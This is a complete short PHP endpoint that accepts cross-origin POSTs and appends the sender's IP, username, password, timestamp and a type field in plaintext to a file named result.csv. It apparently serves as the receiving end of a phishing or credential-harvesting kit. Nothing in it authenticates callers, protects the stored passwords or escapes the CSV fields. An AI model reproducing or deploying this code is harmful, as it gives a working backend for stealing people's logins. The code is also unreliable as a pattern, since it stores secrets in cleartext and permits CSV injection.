<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['ip']) && isset($data['user']) && isset($data['pass']) && isset($data['datetime']) && isset($data['type'])) {
        $csvLine = implode(',', [
            count(file('result.csv')),
            $data['ip'],
            $data['user'],
            $data['pass'],
            $data['datetime'],
            $data['type']
        ]) . "\n";

        if (file_put_contents('result.csv', $csvLine, FILE_APPEND) !== false) {
            echo json_encode(['success' => true]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Failed to write to file']);
        }
    } else {
        echo json_encode(['success' => false, 'error' => 'Missing required data']);
    }
} else {
    echo json_encode(['success' => false, 'error' => 'Invalid request method']);
}
?>